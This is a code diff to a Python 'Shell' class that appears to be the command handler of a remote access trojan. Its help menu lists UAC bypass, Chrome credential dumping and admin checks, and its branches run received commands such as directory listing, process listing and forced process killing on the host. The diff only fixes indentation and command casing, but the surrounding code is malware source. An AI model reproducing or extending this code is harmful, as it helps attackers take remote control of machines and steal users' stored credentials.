@@ -518,7 +518,7 @@ class Shell:
 			if data == "CONN_LOST":
 				return False
 			elif data == "help" or data == "?":
-			    output = '''Commands:
+				output = '''Commands:
 isadmin - Returns whether current user is admin or not
 bypassuac - Bypasses UAC
 dumpchrome - Dumps Chrome Credentials
@@ -532,12 +532,12 @@ help - This menu!
 				data = data[3:]
 				output = fs.change_directory(data.strip())
 			elif data == "ls":
-			        output = execute.execute_shell_command("dir")[1]
+				output = execute.execute_shell_command("dir")[1]
 			elif data == "ps":
-			        output = execute.execute_shell_command("Tasklist")[1]
-                        elif data.startswith("killall"):
-                                process = data.split()[1]
-			        output = execute.execute_shell_command("Taskkill /F /IM "+process+" /T")
+				output = execute.execute_shell_command("tasklist")[1]
+			elif data.startswith("killall"):
+				process = data.split()[1]
+				output = execute.execute_shell_command("taskkill /F /IM "+process+" /T")
 			elif data == "isadmin":
 				output = str(misc.isadmin())
 			elif data == "bypassuac":
